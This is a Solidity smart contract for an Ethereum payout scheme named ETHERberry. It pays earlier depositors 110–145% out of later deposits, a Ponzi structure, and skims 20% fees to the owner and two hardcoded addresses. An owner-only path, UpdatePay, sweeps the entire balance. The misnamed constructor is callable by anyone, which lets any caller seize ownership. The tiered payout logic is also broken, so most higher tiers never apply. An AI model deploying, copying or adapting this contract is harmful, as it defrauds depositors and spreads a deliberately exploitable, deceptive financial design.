 

 
contract ETHERberry 
{
    struct Payer 
    {
        address ETHaddress;
        uint ETHamount;
    }

    Payer[] public persons;

    uint public paymentqueue = 0;
    uint public feecounter;
    uint amount;
    
    address public owner;
    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;
    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;
    address meg=this;

    modifier _onlyowner
    {
        if (msg.sender == owner)
        _
    }
    
    function ETHERanate() 
    {
        owner = msg.sender;
    }
    function()                                                          
    {
        enter();
    }
    function enter()
    {
        if (msg.sender == owner)
	    {
	        UpdatePay();                                          
	    }
	    else                                                          
	    {
            feecounter+=msg.value/5;                                  
	        owner.send(feecounter/2);                           
	        ipyh.send((feecounter/2)/2);                                 
	        hyip.send((feecounter/2)/2);
	        feecounter=0;                                            
	        
            if ((msg.value >= (1 ether)/40) && (msg.value <= (1 ether)))                                
            {
	            amount = msg.value;                                      
	            uint idx=persons.length;                                   
                persons.length+=1;
                persons[idx].ETHaddress=msg.sender;
                persons[idx].ETHamount=amount;
                canPay();                                              
            }
	        else                                                         
	        {
	            msg.sender.send(msg.value - msg.value/5);                   
	        }
	    }

    }
    
    function UpdatePay() _onlyowner                                            
    {
        msg.sender.send(meg.balance);
    }
    
    function canPay() internal                                                  
    {
        uint percent=110;   
        if (persons[paymentqueue].ETHamount > (1 ether)/20)  
        {
            percent =115;
        }
        else if (persons[paymentqueue].ETHamount > (1 ether)/10)  
        {
            percent = 120;
        }
        else if (persons[paymentqueue].ETHamount > (1 ether)/5)   
        {
            percent = 125;
        }
        else if (persons[paymentqueue].ETHamount > (1 ether)/4)   
        {
            percent = 130;
        }
        else if (persons[paymentqueue].ETHamount > (1 ether)/2)    
        {
            percent = 140;
        }
        else if (persons[paymentqueue].ETHamount > ((1 ether)/2 + (1 ether)/4))   
        {
            percent = 145;
        }
        while (meg.balance>persons[paymentqueue].ETHamount/100*percent)             
        {
            uint transactionAmount=persons[paymentqueue].ETHamount/100*percent;     
            persons[paymentqueue].ETHaddress.send(transactionAmount);           
            paymentqueue+=1;                                                    
        }
    }
}